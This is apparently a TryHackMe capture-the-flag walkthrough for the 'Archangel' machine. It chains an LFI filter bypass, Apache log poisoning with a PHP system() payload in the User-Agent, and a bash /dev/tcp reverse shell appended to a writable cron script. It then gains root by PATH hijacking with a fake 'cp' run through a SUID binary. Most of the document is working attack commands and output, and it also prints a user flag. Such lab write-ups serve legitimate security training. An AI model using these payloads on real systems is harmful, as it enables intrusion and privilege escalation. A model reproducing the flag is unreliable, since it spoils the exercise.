# Archangel Walkthrough

### Tools Used

* `nmap` - Network enumeration and service discovery.
* `curl` - Testing the web application, exploiting the LFI, and sending crafted HTTP requests.
* `nc` - Catching reverse shells.
* `bash` - Creating and executing reverse-shell payloads.
* `ps` - Checking whether the cron service is running.
* `file` and `ls` - Inspecting the SUID binary and file permissions.
* `PATH hijacking` - Abusing the SUID `backup` binary to obtain root privileges.

### Step-by-Step Methodology

* **Step 1 - Deploy the machine** - Deploy the Archangel machine in TryHackMe and add `mafialive.thm` to `/etc/hosts` so the target can be accessed by hostname.

* **Step 2 - Enumerate the target** - Use `nmap` to discover the open ports and identify the web server.

```bash
nmap -sC -sV mafialive.thm
```

* **Step 3 - Find the LFI** - Browse the website and inspect `test.php`. The application uses a `view` parameter to include local files.

* **Step 4 - Inspect the source code** - The application attempts to prevent directory traversal by checking for `../..` and requiring `/var/www/html/development_testing` in the supplied path.

* **Step 5 - Bypass the traversal filter** - Use `.././` sequences to bypass the filter and access the Apache access log.

```bash
curl -s "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log"
```

* **Step 6 - Poison the Apache access log** - The LFI allows the Apache access log to be read. By placing PHP code inside an HTTP request header, the code can be written into the access log and later executed through the LFI.

* **Step 7 - Start a Netcat listener** - Start a listener on the AttackBox to receive the reverse shell.

```bash
nc -lvnp 4444
```

* **Step 8 - Send the poisoned request** - Put a PHP command-execution payload in the `User-Agent` header.

```bash
curl -A '<?php system($_GET["cmd"]); ?>' "http://mafialive.thm/"
```

* **Step 9 - Execute the poisoned log** - Include the poisoned Apache log through the LFI and execute a reverse-shell command. This gives a shell as the low-privileged `www-data` user.

* **Step 10 - Check cron jobs** - From the `www-data` shell, inspect `/etc/crontab`.

```bash
cat /etc/crontab
```

The important entry is:

```text
*/1 * * * * archangel /opt/helloworld.sh
```

This means `/opt/helloworld.sh` is executed every minute as the `archangel` user.

* **Step 11 - Check the script permissions** - Inspect `/opt/helloworld.sh`.

```bash
ls -la /opt/helloworld.sh
```

The important part is:

```text
-rwxrwxrwx
```

The script is writable, so it can be modified by a lower-privileged user.

* **Step 12 - Add a reverse shell** - Append a Bash reverse-shell payload to the script. Replace the IP address with the current AttackBox IP.

```bash
echo 'bash -i >& /dev/tcp/10.113.178.194/4444 0>&1' >> /opt/helloworld.sh
```

* **Step 13 - Verify the modified script** - Make sure the payload was added correctly.

```bash
cat /opt/helloworld.sh
```

The script should contain:

```bash
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
bash -i >& /dev/tcp/10.113.178.194/4444 0>&1
```

* **Step 14 - Verify that cron is running** - Check for the cron process.

```bash
ps aux | grep cron
```

A process similar to this confirms that cron is running:

```text
root  ...  /usr/sbin/cron -f
```

* **Step 15 - Catch the `archangel` shell** - On the AttackBox, start the listener again.

```bash
nc -lvnp 4444
```

Wait for the cron job to execute. The reverse shell should connect back and provide an `archangel` shell:

```text
archangel@ubuntu:~$
```

* **Step 16 - Get User 2 flag** - Navigate to the `secret` directory and read `user2.txt`.

```bash
cd ~/secret
ls -la
cat user2.txt
```

* **Step 17 - Find the SUID binary** - The `secret` directory contains a binary called `backup`. Check its type and permissions.

```bash
file backup
ls -la
```

The important permission is:

```text
-rwsr-xr-x 1 root root ... backup
```

The `s` indicates that the binary has the SUID bit set and executes with the owner's privileges, which in this case are root privileges.

* **Step 18 - Create a malicious `cp`** - The `backup` binary uses the `cp` command without an absolute path. Create a fake `cp` executable in the current directory.

```bash
echo '/bin/bash -p' > cp
```

Make it executable:

```bash
chmod +x cp
```

* **Step 19 - Hijack the `PATH`** - Put the current directory at the beginning of the `PATH` variable.

```bash
export PATH=/home/archangel/secret:$PATH
```

When `backup` searches for `cp`, it will now find the malicious version first.

* **Step 20 - Execute the SUID binary** - Run `backup`.

```bash
./backup
```

Then check the current privileges:

```bash
id
```

A successful exploitation gives:

```text
uid=0(root) gid=0(root)
```

This confirms that the shell has root privileges.

* **Step 21 - Get the root flag** - Read the root flag.

```bash
cat /root/root.txt
```

### Attack Chain

```text
Web enumeration
      |
      v
LFI in test.php
      |
      v
Apache log poisoning
      |
      v
www-data shell
      |
      v
Writable cron script
      |
      v
archangel shell
      |
      v
SUID backup binary
      |
      v
PATH hijacking
      |
      v
root
      |
      v
/root/root.txt
```

### Key Vulnerabilities

* `LFI` - `test.php` allows controlled local file inclusion.

* `Log Poisoning` - PHP code can be injected into the Apache access log and executed through the LFI.

* `Writable Cron Script` - `/opt/helloworld.sh` is executed as `archangel` but is writable by a lower-privileged user.

* `SUID Binary` - The `backup` binary runs with root privileges.

* `PATH Hijacking` - The SUID binary relies on `cp` through the `PATH`, allowing a malicious replacement to be executed with elevated privileges.

### Flags

* **User 1 flag**

```text
thm{lf1_t0_rc3_1s_tr1cky}
```

* **User 2 flag**

Obtained from:

```bash
cat ~/secret/user2.txt
```

* **Root flag**

Obtained from:

```bash
cat /root/root.txt
```
